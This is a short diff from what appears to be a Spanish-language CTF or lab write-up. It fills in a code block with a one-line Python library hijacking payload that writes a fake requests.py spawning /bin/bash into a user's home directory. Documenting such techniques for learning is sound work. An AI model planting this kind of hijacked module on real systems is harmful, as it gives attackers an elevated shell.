@@ -168,5 +168,5 @@ import requests;
 
 Por lo que podemos hacer **Python library hijacking**. 
 ```
-echo 
+echo 'import os; os.system("/bin/bash")' > /home/iker/requests.py
 ```
